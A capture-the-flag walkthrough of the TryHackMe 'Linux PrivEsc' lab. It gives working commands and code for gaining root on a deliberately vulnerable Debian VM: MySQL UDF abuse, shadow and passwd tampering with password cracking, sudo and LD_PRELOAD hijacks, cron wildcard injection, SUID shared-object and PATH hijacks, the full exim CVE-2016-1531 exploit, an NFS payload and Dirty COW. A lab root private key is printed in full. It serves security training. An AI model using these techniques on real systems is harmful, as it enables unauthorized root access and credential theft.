---
title: Linux PrivEsc
desc: >-
  THM: Practice your Linux Privilege Escalation skills on an intentionally
  misconfigured Debian VM with multiple ways to get root! SSH is available.
---
## Task 1 - Introduction
The aim of this room is to walk us through a variety of Linux Privilege Escalation techniques. The room provides a vulnerable Debian VM to work on with the credentials: `user:password123`.

Let's begin by connecting to the machine using ssh. Newer versions of OpenSSH have deprecated ssh-rsa so we will need to explicitly tell OpenSSH to use the encryption method. 

```console
$ ssh user@<Machine_IP> -oHostKeyAlgorithms=+ssh-rsa
```
Running the *id* command, we get the following results:

![id](../../assets/images/thm/linuxprivesc/01-id.png)

## Task 2 - Service Exploits
In this task, we will be looking at exploiting MySQL for privilege escalation by taking advantage of User Defined Functions (UDF) to run system commands as root via the MySQL service. In order for us to do this, the MySQL service needs to be running on the target as root.

UDF functions are language agnostic and can be written in any programming language to be complied natively into a shared library.

Let's begin by confirming that the MySQL is running on the VM.

```console
ps aux | grep mysql
```
![ps MySQL](../../assets/images/thm/linuxprivesc/02-ps_mysql.png)

Based on the results above, we can confirm that the MySQL service is running on the target machine with root privileges.

For this task, we are told that MySQL service is running as the root user with a ***blank password***. Alternatively, we can also look in the `/etc/mysql/my.cnf` file (or other database connection files used by web applications) for any user passwords.

Let's confirm the version of MySQL service running on the target machine. We can do this with one of the following commands.

```console
mysql -V
mysql -u root -p -e 'select @@version;'
```
![MySQL Version](../../assets/images/thm/linuxprivesc/03-mysql_version.png)

This version of MySQL has a vulnerability which allows users to run user-defined functions to execute commands.

![MySQL UDF Vuln](../../assets/images/thm/linuxprivesc/04-mysql_udf_vuln.png)

The exploit can be downloaded from Exploit DB: [raptor_udf2.c](https://www.exploit-db.com/exploits/1518)

Let's download the exploit code onto the target machine and compile the exploit code into a shared object file.

```console
wget https://www.exploit-db.com/download/1518 -o raptor_udf2.c
```
```console
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```
![UDF Compile](../../assets/images/thm/linuxprivesc/05-mysql_compile_sharedlib.png)

We now need to connect to the MySQL database and determine the path of the *plugins directory* where MySQL stores its UDF functions.

```console
mysql -u root -p
show variables like '%plugin%';
```
![MySQL Plugin Directory](../../assets/images/thm/linuxprivesc/06-mysql_plugin.png)

One additional check we need to do is to check if the variable *secure_file_priv* is enabled to allow data import and export operations like *load_file* and *load_data* functions. A null/empty value means that the variable is disabled and thus we can load data into the database.

```console
show variables like '%secure_file_priv%';
```
![MySQL Secure File Priv](../../assets/images/thm/linuxprivesc/07-mysql_secure_file_priv.png)

Now that we know the location where we need to store our malicious shared library, we can switch to the *mysql* database and create our user defined function which points to our compiled exploit.

Let's switch to the database in question.

```sql
use mysql;
```
![MySQL Switch Database](../../assets/images/thm/linuxprivesc/08-mysql_switch_database.png)

Now import the shared library by inserting its contents into a table. We will first need to create a table into which we can import the library.

```sql
create table foo(line blob);
insert into foo values(load_file('/tmp/raptor_udf2.so'));
```
![Insert Shared Library](../../assets/images/thm/linuxprivesc/09-mysql_insert_sharedlib.png)

Now select the binary contents in the shared library and dump them into the plugins directory.

```sql
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
```
![MySQL Dump Sharedlib Contents](../../assets/images/thm/linuxprivesc/10-mysql_dumpfile.png)

Finally, we need to create a function to call the shared library.

```sql
create function do_system returns integer soname 'raptor_udf2.so';
```
![MySQL Function](../../assets/images/thm/linuxprivesc/11-mysql_function.png)

We can confirm if our function is present in the *mysql* database.

```sql
select * from mysql.func;
```
![MySQL Function Confirm](../../assets/images/thm/linuxprivesc/12-mysql_function_confirm.png)

We can now use the above created function to run system commands which will be executed as root. Let's go ahead and use our function to copy `/bin/bash` to the `/tmp/rootbash` and set the SUID bit.

```sql
select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
```
![MySQL Function Call](../../assets/images/thm/linuxprivesc/13-mysql_function_call.png)

We can exit out of MySQL and execute the `/tmp/rootbash` to privilege escalation.

```console
./rootbash -p
```
![MySQL Root](../../assets/images/thm/linuxprivesc/14-mysql_root.png)

Before continuing to the next task, we need to remove the `/tmp/rootbash` binary as we will be creating this file again in a future task.

## Task 3 - Weak File Permissions - Readable /etc/shadow
The `/etc/shadow` stores encrypted user password hashes and is only accessible to the root user and the shadow group. For more information on `/etc/shadow` file, see [Passwd/Shadow File](../../notes/privesc_linux/passwdshadow.md).

In this task, we will be exploiting misconfigured permissions on the `/etc/shadow` file which makes it globally-readable. Let's start by looking at the permissions.

```console
ls -l /etc/shadow
```
![Shadow Permissions](../../assets/images/thm/linuxprivesc/15-shadow_perm.png)

As we can see, the file has been misconfigured to be writeable and readable by all other users. Let's look at the contents of the file.

```console
cat /etc/shadow
```
![Shadow Content](../../assets/images/thm/linuxprivesc/16-shadow_content.png)

We can use John the Ripper (John) to extract the root user's password. The process of using John to extract passwords from the `/etc/shadow` file requires two basic steps. We first have to use a utility called *unshadow* to combine the contents of `/etc/passwd` file with the contents of `/etc/shadow` file. We begin by copying the line for the root user from the `/etc/passwd` file and the `/etc/shadow` file to files `passwd.txt` and `shadow.txt` respectively. As John is not installed on the target VM, we will need to do these steps locally on our machine.

```console
head -n 1 /etc/passwd > passwd.txt
head -n 1 /etc/shadow > shadow.txt
```
![Unshadow Prep](../../assets/images/thm/linuxprivesc/17-unshadow_prep.png)

Copy the above files (or their contents) to our local machine and then use the *unshadow* command.

```console
unshadow passwd.txt shadow.txt > unshadowed.txt
```
![Unshadowed](../../assets/images/thm/linuxprivesc/18-unshadow_file.png)

We now know proceed with using John to extract the password from the hash.

```console
john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt unshadowed.txt
```
![Shadow Password](../../assets/images/thm/linuxprivesc/19-shadow_john.png)

With the above credentials we can now privilege escalate to the root user.

```console
su root
```
![Shadow Root](../../assets/images/thm/linuxprivesc/20-shadow_root.png)

## Task 4 - Weak File Permissions - Writeable /etc/shadow
In the previous task, we found that the `/etc/shadow` file was writeable by all other users on the system. With the ability to modify the contents of the file, we can simply replace the root user's current password with a new one of our choosing. For more information on the `/etc/shadow` file format and password hash generation, see [Passwd/Shadow File](../../notes/privesc_linux/passwdshadow.md).

To begin, let's generate a new password using the *OpenSSL* utility which comes pre-installed on most modern Linux operating systems.

```console
openssl passwd -6 -salt salt pass123
```
![New Password Hash](../../assets/images/thm/linuxprivesc/21-shadow_new_pass_hash.png)

We can now edit the `/etc/shadow` file on the target machine and replace the existing password hash with the one we generated above.

![Modify Shadow](../../assets/images/thm/linuxprivesc/22-shadow_modify.png)

Save the file and exit. We can now use our new credentials `root:pass123` to privilege escalate to the root user.

```console
su root
```
![Shadow Write Root](../../assets/images/thm/linuxprivesc/23-shadow_write_root.png)

## Task 5 - Weak File Permissions - Writable /etc/passwd
In this task, we will be looking at weak file permissions on the `/etc/passwd` file. The `/etc/passwd` file is normally globally-readable and only the super user has permissions to write to it. A `/etc/passwd` file with global write permissions allows any user to modify the contents and give themselves root permissions. For more information on exploiting the `/etc/passwd` file, see [Passwd/Shadow File](../../notes/privesc_linux/passwdshadow.md).

Let's look at the permissions on the `/etc/passwd` file for this task.

```console
ls -l /etc/passwd
```
![Passwd Permissions](../../assets/images/thm/linuxprivesc/24-passwd_perm.png)

As we can see from the image above, the `/etc/passwd` file has been marked as writeable by all other users present on the system. As a consequence, we can simply edit the contents of `/etc/passwd` file and gain root access by appending a new user with root privileges to the file.

Let's begin by generating a new password for our new user using the *openssl* utility.

```console
openssl passwd pass123
```
![New Password Hash](../../assets/images/thm/linuxprivesc/25-passwd_new_hash.png)

We can now edit the `/etc/passwd` file by adding a new user with root privileges with the above password hash.

![New Root User](../../assets/images/thm/linuxprivesc/26-passwd_new_root.png)

We can now switch to the new user using the new password.

```console
su newroot
```
![Passwd PrivEsc](../../assets/images/thm/linuxprivesc/27-passwd_root.png)

## Task 6 - Sudo - Shell Escape Sequences
We can list all programs which sudo allows us to run by using the following command:

```console
sudo -l
```
By leveraging [GTFOBins](https://gtfobins.github.io/), we can attempt to gain privilege escalation with the programs listed via an escape sequence.

Let's list all the programs sudo permits us to run as a low privileged user for this task.

![sudo -l](../../assets/images/thm/linuxprivesc/28-sudo-l.png)

Note that each of the programs listed can be run without a password needed to be supplied due to the `NOPASSWD` attribute.

Let's go ahead and see if we can find a privilege escalation vector using the `/usr/bin/find` binary. Searching the binary on the GTFOBins, we find that if the `/usr/bin/find` binary is allowed to run as superuser by *sudo*, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access. We can abuse this by using the `-exec` flag to execute any system binary (such as `/bin/bash`) with root privileges.

```console
sudo find . -exec /bin/bash \; -quit
```
![sudo -l Find PrivEsc](../../assets/images/thm/linuxprivesc/29-sudo-l_root.png)

Note that privilege escalation vectors exist all of the remaining binaries (except apache2) listed when running the `sudo -l` command.

## Task 7 - Sudo - Environment Variables
Sudo can be configured to inherit certain environment variables from the user's environment. We can check which environment variables are inherited by looking for the *env_keep* option when running the `sudo -l` command.

![Sudo Environment Variable](../../assets/images/thm/linuxprivesc/30-sudo_env.png)

In the above example, the *LD_PRELOAD* and *LD_LIBRARY_PATH* are both inherited from the user's environment. *LD_PRELOAD* loads a shared object before any others when a program is run. *LD_LIBRARY_PATH* provides a list of directories where shared libraries are searched for first.

We can exploit this by creating a shared object using the following code. Save the code to a file in `/tmp/preload.c`.

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
        unsetenv("LD_PRELOAD");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```
Then create the shared object using the following syntax:

```console
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /tmp/preload.c
```
![Sudo Env Shared Object](../../assets/images/thm/linuxprivesc/31-sudo_env_shared_object.png)

We can now spawn an interactive shell by running one of the programs listed when we run the `sudo -l` command, while setting the *LD_PRELOAD* environment to the full path of the new shared object. The interactive shell will be spawned with root privileges due to the listed binary executing with root permissions. Let's see this in action.

```console
sudo LD_PRELOAD=/tmp/preload.so [binary_name]
```
![Sudo Env Shared Object Root](../../assets/images/thm/linuxprivesc/32-sudo_env_shared_object_root.png)

Alternatively, we can also exploit shared libraries used by a program when executing. For example, let's look at the shared libraries used by `/usr/sbin/apache2` by running the following command:

```console
ldd /usr/sbin/apache2
```
![Sudo Env Shared Lib](../../assets/images/thm/linuxprivesc/33-sudo_env_shared_lib.png)

Now let's create a shared object with the same name as one of the listed libraries (eg: libcrypt.so.1) using the following code. Save the code to a file in `/tmp/lib_path.c`.

```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

Then create the shared object using the following syntax:

```console
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /tmp/library_path.c
```
![Sudo Env Lib Path](../../assets/images/thm/linuxprivesc/34-sudo_env_shared_lib_gcc.png)

We can now go ahead and execute the binary while supplying the *LD_LIBRARY_PATH* environment variable to where our malicious shared object resides. This will spawn an interactive root shell thus gaining our privilege escalation.

```console
sudo LD_LIBRARY_PATH=/tmp apache2
```
![Sudo Env Shared Lib PrivEsc](../../assets/images/thm/linuxprivesc/35-sudo_env_shared_lib_root.png)

## Task 8 - Cron Jobs - File Permissions
By default, Cron runs as root when executing `/etc/crontab`. Scripts executed by Cron that are editable by an unprivileged user become a vector for privilege escalation. For more information on privilege escalation using Cron Jobs with weak file permissions, see [Cron Jobs](../../notes/privesc_linux/crontab.md).

Let's begin by looking at the contents of `/etc/crontab` in order to identify any possible targets.

![Crontab](../../assets/images/thm/linuxprivesc/36-crontab.png)

In the above example, we can see that two scripts, `overwrite.sh` and `/usr/local/bin/compress.sh` ,are scheduled to run every minute. Let's locate the full path of `overwrite.sh` and look at its file permissions.

```console
locate overwrite.sh
```
![Cron Job Script Perm](../../assets/images/thm/linuxprivesc/37-crontab_overwrite.png)

Looking at the permissions on the script, we see that it is writeable by any user on the machine. We can exploit this misconfiguration to gain privilege escalation by modifying the script to make a copy of the `/bin/bash` binary and set the SUID bit on it. Let's see this in action.

Let's modify the `/usr/local/bin/overwrite.sh` file with the following commands:

```console
cp /bin/bash /tmp/rootbash
chmod u+s /tmp/rootbash
```
![Crontab Root Bash SUID](../../assets/images/thm/linuxprivesc/38-crontab_overwrite_rootbash.png)

Now all we need to do is wait for Cron to run the scheduled task. Execute the `/tmp/rootbash` binary using the following command to gain root access:

```console
/tmp/rootbash -p
```
![Crontab Overwrite PrivEsc](../../assets/images/thm/linuxprivesc/39-crontab_overwrite_privesc.png)

## Task 9 - Cron Jobs - PATH Environment Variable
If absolute path for a script in a scheduled task in `/etc/crontab` file is not defined and the PATH variable contains a globally writeable directory as its first entry, we can force Cron to execute a malicious script we control to gain privilege escalation.

Let's begin by looking at the contents of the `/etc/crontab` file again.

![Crontab Path](../../assets/images/thm/linuxprivesc/40-crontab_path.png)

Note that the PATH variable in the above image includes the `/home/user` directory as the first entry. When a binary or script is executed by Cron, this is will be the first directory it will look in before moving on to `/usr/local/sbin` and so on.

Also note that the scheduled task which executes the *overwrite.sh* script does not define the absolute path for the script file. Since we have full read and write access to the `/home/user` directory, we can simply create our own malicious *overwrite.sh* file on the directory to gain privilege escalation. This is possible because when the scheduled task is executed Cron first looks in the `/home/user` directory for the *overwrite.sh* file before looking elsewhere.

Let's create our *overwrite.sh* in the `/home/user` directory with the following content:

```bash
#!/bin/bash

cp /bin/bash /tmp/rootbash
chmod u+s /tmp/rootbash
```
Give the script executable permission and wait for Cron to execute the scheduled task. Execute the new *rootbash* binary with the following syntax to get root access:

```console
/home/user/rootbash -p
```
![Crontab Path PrivEsc](../../assets/images/thm/linuxprivesc/41-crontab_path_privesc.png)

## Task 10 - Cron Jobs - Wildcards
A wildcard injection vulnerability occurs when a command uses the wildcard (*) character in an insecure way thus allowing an attacker to change the command's behaviour by injecting command flags. For more information, see [Cron Jobs](../../notes/privesc_linux/crontab.md).

Let's look at the contents of the second cron job script *compress.sh*:

![Crontab Wildcard Injection](../../assets/images/thm/linuxprivesc/42-crontab_wildcard.png)

We can see from the results that the script calls the *tar* utility is being run from the `/home/user` directory with a wildcard (*). Looking at GTFOBins, we can see that the command line options `--checkpoint` and `--checkpoint-action` can allow us to run other commands as part of a checkpoint feature.

We can exploit this by forcing the checkpoint feature in the *tar* utility to execute our malicious script to get privilege escalation.

Let's start by creating a script called *privesc.sh* which copies the `/bin/bash` binary to the `/home/user` directory and sets the SUID bit.

```bash
#!/bin/bash

cp /bin/bash /home/user/rootbash
chmod u+s /home/user/rootbash
```
Before proceeding, we need to give the script executable permissions. Now let's make two more files with the following syntax in the `/home/user` directory:

```console
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=privesc.sh
```
When the *tar* utility in the cron job runs, the wildcard (*) will expand to include the files we created above. Since their filenames are valid commands, *tar* will recognize them as such and treat them as command line options rather than filenames.

Once the scheduled task executes, we should see the *rootbash* binary in the `/home/user` folder with the SUID bit set. We can execute the *rootbash* binary to gain root access.

![Crontab Wildcard Injection PrivEsc](../../assets/images/thm/linuxprivesc/44-crontab_wildcard_privesc.png)

## Task 11 - SUID/SGID (GUID) Executables - Known Exploits
For more information regarding SUID/GUID permissions, see [SUID](../../notes/privesc_linux/suid.md).

The following command can be used to identify binaries which have SUID and GUID permissions assigned to them:

```console
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```
Alternatively, we can use the following command to get the same result:

```console
find / -perm /u=s,g=s -type f -exec ls -l {} \; 2>/dev/null
```
![SUID/SGID List](../../assets/images/thm/linuxprivesc/45-suid_list.png)

In the task description, we are told that the `/usr/sbin/exim-4.84-3` binary has a known exploit for this particular version of the *exim* utility. We can confirm this by searching the [Exploit-DB](https://www.exploit-db.com/) database which reveals a [Local Privilege Escalation](https://www.exploit-db.com/exploits/39535) exploit.

```bash
#!/bin/sh
# CVE-2016-1531 exim <= 4.84-3 local root exploit
# ===============================================
# you can write files as root or force a perl module to
# load by manipulating the perl environment and running
# exim with the "perl_startup" arguement -ps. 
#
# e.g.
# [fantastic@localhost tmp]$ ./cve-2016-1531.sh 
# [ CVE-2016-1531 local root exploit
# sh-4.3# id
# uid=0(root) gid=1000(fantastic) groups=1000(fantastic)
# 
# -- Hacker Fantastic 
echo [ CVE-2016-1531 local root exploit
cat > /tmp/root.pm << EOF
package root;
use strict;
use warnings;

system("/bin/sh");
EOF
PERL5LIB=/tmp PERL5OPT=-Mroot /usr/exim/bin/exim -ps
```
We can download the above exploit into the `/tmp` directory, mark it as executable, and execute it to get root privileges.

![SUID Exploit](../../assets/images/thm/linuxprivesc/46-suid_exploit.png)

![SUID Exploit PrivEsc](../../assets/images/thm/linuxprivesc/47-suid_exploit_privesc.png)

## Task 12 - SUID/SGID Executables - Shared Object Injection
In this task, we are told that the `/usr/local/bin/suid-so` SUID binary is vulnerable to shared object injection. Let's confirm this by observing the behaviour of the binary when it is executed.

Let's begin by executing the binary located at `/usr/local/bin/suid-so`. Note that a progress bar is displayed before the program exits.

![SUID Shared Object](../../assets/images/thm/linuxprivesc/48-suid_shared_object.png)

We can look at the inner workings of the binary by using a utility called *strace*; *strace* is a diagnostic, debugging, and instructional userspace utility for the Linux OS. It intercepts and records the system calls which are called by a process and the signals which are received by a process.

```console
strace /user/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file:
```
![SUID Shared Object strace](../../assets/images/thm/linuxprivesc/49-suid_shared_object_strace.png)

Notice that the the output shows that the *suid-so* binary tries to load the `/home/user/.config/libcalc.so` shared object which does not exist. We can exploit this to gain privilege escalation by creating a malicious shared object in the specified directory which will get called when the *suid-so* binary gets executed.

Let's start by creating the `/home/user/.config` directory.

```console
mkdir /home/user/.config
```
We can now create a shared object with the following code which will spawn a Bash shell. Save the file to the `/home/user/.config` folder as *libcalc.c*.

```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
        setuid(0);
        system("/bin/bash -p");
}
```
![SUID Shared Object Malicious Code](../../assets/images/thm/linuxprivesc/50-suid_shared_object_code.png)

Let's compile the code using *gcc* into a shared object using the following syntax:

```console
gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/.config/libcalc.c
```
![SUID Shared Object Compile](../../assets/images/thm/linuxprivesc/51-suid_shared_object_so.png)

Now let's execute the *suid-so* binary and see if we get root privileges.

![SUID Shared Object PrivEsc](../../assets/images/thm/linuxprivesc/52-suid_shared_object_privesc.png)

## Task 13 - SUID/SGID Executables - Environment Variables
In this task, we are told that the `/usr/local/bin/suid-env` binary can be exploited due to it inheriting the user's PATH environment variable and attempting to execute programs without specifying an absolute path.

Let's execute the binary to see what it does.

![SUID Environment Variables](../../assets/images/thm/linuxprivesc/53-suid_env.png)

Looks like when the binary is executed, it starts the *apache2* webserver.

Since we do not have the source code of the binary in question, we can't simply go through the code to figure out what is going on. A good next step is to run the *strings* utility on the binary. The *strings* utility prints the printable character sequences that are at least four character long and are followed by an unprintable character. It is a useful utility for determining the contents of a non-text file and is often the first step when reverse-engineering a binary.

Let's run the *strings* utility against the binary and look at the results.

![SUID Environment Variables Strings](../../assets/images/thm/linuxprivesc/54-suid_env_strings.png)

Based on the *strings* output, it looks like the binary attempts to start *apache2* using the *service* binary without specifying its absolute path (`/usr/sbin/service`). Note that the *service* binary typically has the SUID bit set by default.

Let's exploit this by creating our own binary with the same name which loads a simple Bash shell. We can use the following code:

```c
int main() {
        setuid(0);
        system("/bin/bash -p");
}
```
![SUID Environment Variables Code](../../assets/images/thm/linuxprivesc/55-suid_env_code.png)

Let's compile our code using *gcc*.

```console
gcc -o service /tmp/service.c
```
![SUID Environment Variables Compile](../../assets/images/thm/linuxprivesc/56-suid_env_compile.png)

Now all we need to do is prepend the directory where our malicious binary is located to the PATH variable and then execute the *suid-env* binary again to gain root privileges.

```console
PATH=/tmp:$PATH
```
![SUID Environment Variables PrivEsc](../../assets/images/thm/linuxprivesc/57-suid_env_privesc.png)

## Task 14 - SUID/SGID Executables - Abusing Shell Features (#1)
In this task, the *suid-env* has been updated to use absolute path of the *service* executable (`/usr/sbin/service`) to start the *apache2* webserver. We can verify this by running the *strings* utility on the new binary *sudo-env2*.

![Shell Feature 1 Strings](../../assets/images/thm/linuxprivesc/58-shell_escape_1_strings.png)

We cannot rely on the previous method using Environment Variables to get privilege escalation.

In this task, we will be looking we will exploiting a feature in Bash (versions < 4.2-048) which make it possible to define shell functions with names that resemble file paths. By exporting these functions, binaries in the vulnerable versions of Bash could be forced to use the exported functions instead of the actual executable at that file path.

Let's see this in action. We first need to verify the version of Bash installed on the machine.

```console
/bin/bash --version
```
![Shell Feature 1 Bash Version](../../assets/images/thm/linuxprivesc/59-shell_escape_1_bashver.png)

Looks like the Bash version running on the machine is vulnerable to this attack.

Let's create a Bash function and export it with the name `/usr/sbin/service` that executes a new Bash shell (using -p to retain permissions).

```bash
function /usr/sbin/service { /bin/bash -p; }
export -f /usr/sbin/service
```
Once the function is exported, run the *suid-env2* binary to gain a root shell.

![Shell Feature 1 PrivEsc](../../assets/images/thm/linuxprivesc/60-shell_escape_1_privesc.png)

## Task 15 - SUID/SGID Executables - Abusing Shell Features (#2)
In this task, we will be abusing the debugging mode in Bash shell (version < 4.4). Bash versions less than 4.4 uses the environment variable *PS4* to display an extra prompt for debugging statements. Debugging statements can be used to embed commands which present an privilege escalation vector for attackers.

Let's run the `/usr/local/bin/suid-env2` binary with Bash debugging enabled and the *PS4* variable set to an embedded command wich creates an SUID version of `/bin/bash`.

```bash
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
```
![Shell Feature 2 Debug Mode](../../assets/images/thm/linuxprivesc/61-shell_escape_2_debug.png)

We can then run the *rootbash* binary with the `-p` argument to get root privileges.

![Shell Feature 2 PrivEsc](../../assets/images/thm/linuxprivesc/62-shell_escape_2_privesc.png)

## Task 16 - Password & Keys - History Files
It is not uncommon for Linux users to accidentally type their password on the command line instead of into a password prompt. As most Linux shells keep a history of user input, these passwords may get recorded in a history file. It is worthwhile going through these history files to see what you can find as a low hanging fruit.

We can view contents of all the hidden history files in the user's directory using the following command:

```console
cat ~/.*history | less
```

## Task 17 - Password & Keys - Config Files
Configuration files often contain passwords in plaintext or other reversible formats. Enumerating the services present on the machine can help direct attackers to relevant config files to parse for credentials.

Let's look at an example for OpenVPN service.

![OpenVPN Config File Content](../../assets/images/thm/linuxprivesc/63-openvpn_config.png)

The OpenVPN config file contains a reference to another location where the root user's credentials can be found.

![OpenVPN Root Creds](../../assets/images/thm/linuxprivesc/64-openvpn_creds.png)

## Task 18 - Passwords & Keys - SSH Keys
Users may mistakenly make backups of important files without taking precautions to save guard them with correct permissions.

We can look for hidden files and directories in the system root by using the `ls -la /` command. One less common privilege escalation vector in practical engagements (more common in CTF challenges) is the presence of a user's private SSH key.

Listing the hidden files and directories on our target system, we find a hidden `.ssh` directory with a globally readable private SSH key for the root user (*root_key*).

![SSH Private Key](../../assets/images/thm/linuxprivesc/65-ssh_key.png)

We can copy the contents of the private key to a similarly named file on our local system and give it appropriate permissions.

```text
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA3IIf6Wczcdm38MZ9+QADSYq9FfKfwj0mJaUteyJHWHZ3/GNm
gLTH3Fov2Ss8QuGfvvD4CQ1f4N0PqnaJ2WJrKSP8QyxJ7YtRTk0JoTSGWTeUpExl
p4oSmTxYnO0LDcsezwNhBZn0kljtGu9p+dmmKbk40W4SWlTvU1LcEHRr6RgWMgQo
OHhxUFddFtYrknS4GiL5TJH6bt57xoIECnRc/8suZyWzgRzbo+TvDewK3ZhBN7HD
eV9G5JrjnVrDqSjhysUANmUTjUCTSsofUwlum+pU/dl9YCkXJRp7Hgy/QkFKpFET
Z36Z0g1JtQkwWxUD/iFj+iapkLuMaVT5dCq9kQIDAQABAoIBAQDDWdSDppYA6uz2
NiMsEULYSD0z0HqQTjQZbbhZOgkS6gFqa3VH2OCm6o8xSghdCB3Jvxk+i8bBI5bZ
YaLGH1boX6UArZ/g/mfNgpphYnMTXxYkaDo2ry/C6Z9nhukgEy78HvY5TCdL79Q+
5JNyccuvcxRPFcDUniJYIzQqr7laCgNU2R1lL87Qai6B6gJpyB9cP68rA02244el
WUXcZTk68p9dk2Q3tk3r/oYHf2LTkgPShXBEwP1VkF/2FFPvwi1JCCMUGS27avN7
VDFru8hDPCCmE3j4N9Sw6X/sSDR9ESg4+iNTsD2ziwGDYnizzY2e1+75zLyYZ4N7
6JoPCYFxAoGBAPi0ALpmNz17iFClfIqDrunUy8JT4aFxl0kQ5y9rKeFwNu50nTIW
1X+343539fKIcuPB0JY9ZkO9d4tp8M1Slebv/p4ITdKf43yTjClbd/FpyG2QNy3K
824ihKlQVDC9eYezWWs2pqZk/AqO2IHSlzL4v0T0GyzOsKJH6NGTvYhrAoGBAOL6
Wg07OXE08XsLJE+ujVPH4DQMqRz/G1vwztPkSmeqZ8/qsLW2bINLhndZdd1FaPzc
U7LXiuDNcl5u+Pihbv73rPNZOsixkklb5t3Jg1OcvvYcL6hMRwLL4iqG8YDBmlK1
Rg1CjY1csnqTOMJUVEHy0ofroEMLf/0uVRP3VsDzAoGBAIKFJSSt5Cu2GxIH51Zi
SXeaH906XF132aeU4V83ZGFVnN6EAMN6zE0c2p1So5bHGVSCMM/IJVVDp+tYi/GV
d+oc5YlWXlE9bAvC+3nw8P+XPoKRfwPfUOXp46lf6O8zYQZgj3r+0XLd6JA561Im
jQdJGEg9u81GI9jm2D60xHFFAoGAPFatRcMuvAeFAl6t4njWnSUPVwbelhTDIyfa
871GglRskHslSskaA7U6I9QmXxIqnL29ild+VdCHzM7XZNEVfrY8xdw8okmCR/ok
X2VIghuzMB3CFY1hez7T+tYwsTfGXKJP4wqEMsYntCoa9p4QYA+7I+LhkbEm7xk4
CLzB1T0CgYB2Ijb2DpcWlxjX08JRVi8+R7T2Fhh4L5FuykcDeZm1OvYeCML32EfN
Whp/Mr5B5GDmMHBRtKaiLS8/NRAokiibsCmMzQegmfipo+35DNTW66DDq47RFgR4
LnM9yXzn+CbIJGeJk5XUFQuLSv0f6uiaWNi7t9UNyayRmwejI6phSw==
-----END RSA PRIVATE KEY-----
```
```console
chmod 600 root_key
```
![SSH Private Key Copied](../../assets/images/thm/linuxprivesc/66-ssh_key_copied.png)

We can now SSH into the machine using the private key as root. Note that for this task, the private key does not have a password configured. In most sceneries, a private SSH key would have been configured with a password which would need to be cracked using *John the Ripper*.

```console
ssh -i root_key root@10.10.114.180 -oPubkeyAcceptedKeyTypes=+ssh-rsa -oHostKeyAlgorithms=+ssh-rsa
```
Also note that due to the age of the machine, we needed to add additional parameters indicating the key type and algorithm which aren't necessarily required for more modern systems.

![SSH PrivEsc](../../assets/images/thm/linuxprivesc/67-ssh_privesc.png)

## Task 19 - NFS
Files created via NFS inherit the remote user's ID. If the user is root, and *root squashing* is enabled, the ID will instead be set to the *nobody* user.

In our task, we can check the NFS share configuration on the machine using the following command:

```console
cat /etc/exports
```
![NFS Configuration](../../assets/images/thm/linuxprivesc/68-nfs.png)

Note that in our case, the `/tmp` share has root squashing disabled. On our machine, we can now switch to the root user, create a mount point, and mound the `/tmp` share as indicated below.

```console
mkdir /tmp/nfs
mount -o rw, vers=3 10.10.114.180:/tmp /tmp/nfs
```
![NFS Mount](../../assets/images/thm/linuxprivesc/69-nfs_mount.png)

We can now use *msfvenom* to create a payload which executes `/bin/bash` with the `-p` option to retain permissions.

```console
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
```
Mark the payload as executable and set SUID permissions.

```console
chmod +xs /tmp/nfs/shell.elf
```
![NFS Shell](../../assets/images/thm/linuxprivesc/70-nfs_shell.png)

Now back on our target machine, we can execute the payload in the `/tmp` share folder to get our privilege escalation.

![NFS PrivEsc](../../assets/images/thm/linuxprivesc/71-nfs_privesc.png)

## Task 20 - Kernel Exploits
!!! warning
    Kernel exploits can leave the system in an unstable state and should be only ran as a last resort.

On our target system, we can run the [Linux Exploit Suggester 2](https://github.com/jondonas/linux-exploit-suggester-2) tool to identify potential kernel exploits on the current system.

```console
perl /tmp/linux-exploit-suggester-2.pl
```
![Linux Exploit Suggester 2](../../assets/images/thm/linuxprivesc/72-kernel_exploit.png)

The popular Linux kernel exploit *Dirty COW* is listed as one of the suggested exploits. We can obtain the exploit from [Exploit-DB Dirty COW](https://www.exploit-db.com/raw/40839). Let's compile the code and run it. Note that hte exploit may take several minutes to complete.

```console
gcc -pthread /tmp/c0w.c -o c0w
```
```console
./c0w
```
Once the exploit completes, we can run `/usr/bin/passwd` to gain root privileges.

![Dirty COW](../../assets/images/thm/linuxprivesc/73-kernel_exploit_dirtycow.png)

## Task 21 - Privilege Escalation Scripts
There are several scripts available which can aid us in finding and identifying possible privilege escalation vectors on Linux. Below is a list of some useful scripts:

- [LinEnum](https://github.com/rebootuser/LinEnum)
- [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
- [Linux Smart Enumeration](https://github.com/diego-treitos/linux-smart-enumeration/blob/master/lse.sh)
- [Linux Exploit Suggester 2](https://github.com/jondonas/linux-exploit-suggester-2)
